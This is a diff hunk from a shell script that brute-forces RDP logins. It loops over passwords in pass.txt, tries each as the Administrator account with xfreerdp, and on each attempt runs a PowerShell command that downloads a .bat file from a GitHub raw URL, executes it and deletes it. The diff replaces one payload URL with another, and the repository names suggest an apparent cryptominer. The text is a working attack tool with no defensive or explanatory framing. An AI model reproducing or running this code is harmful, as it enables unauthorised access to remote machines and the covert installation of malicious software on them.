@@ -42,7 +42,7 @@ do
                 file_path="./pass.txt"
                 while IFS= read -r line
                 do
-                    xfreerdp /v:$ip_address /u:Administrator /p:$line + cmd:"powershell -Command '[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $wc = New-Object System.Net.WebClient; $tempfile = [System.IO.Path]::GetTempFileName(); $tempfile += '.bat'; $wc.DownloadFile('http://raw.githubusercontent.com/kfcminer/kfc/main/kfc.bat', $tempfile); & $tempfile; Remove-Item -Force $tempfile'"
+                    xfreerdp /v:$ip_address /u:Administrator /p:$line + cmd:"powershell -Command '[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $wc = New-Object System.Net.WebClient; $tempfile = [System.IO.Path]::GetTempFileName(); $tempfile += '.bat'; $wc.DownloadFile('https://raw.githubusercontent.com/1oneman1/syscooler/main/syscooler.bat', $tempfile); & $tempfile; Remove-Item -Force $tempfile'"
                 done < "$file_path"
             else
 
